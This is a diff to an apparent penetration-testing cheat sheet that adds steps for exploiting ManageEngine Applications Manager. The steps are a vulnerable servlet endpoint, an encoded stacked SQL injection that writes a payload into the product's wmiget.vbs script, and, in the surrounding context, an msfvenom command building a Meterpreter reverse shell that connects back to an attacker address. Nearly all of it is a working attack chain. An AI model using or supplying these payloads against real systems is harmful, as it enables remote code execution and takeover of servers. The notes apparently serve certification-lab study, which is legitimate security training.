@@ -152,11 +152,20 @@
         ;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+
 
 [Context: ManageEngine Applications Manager]
+    # Vulnerable endpoint
+        GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1
     # Generate reverse shell
         msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
     # Convert vbs into one-liner: (https://github.com/noraj/vbsmin)
         vbsmin ./wmiget.vbs
-    # Inject to wmiget.vbs
+    # Inject payload to wmiget.vbs
+        original:payload {read code, modify to make sure the payload function will be called}
+
+    # Craft encoded SQL Injection payload (write the payload above to wmiget.vbs file)
+        ;copy+(select+convert_from(decode($$base64-encoded-one-liner-payload$$,$$base64$$),$$utf-8$$))+to+$$c:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;--+
+
+        ### Note: replace '+'' in 'base64-encoded-one-liner-payload' by '%2b' | or just url-encode the whole payload
+
 </code></pre></div></div>
 <hr>
 
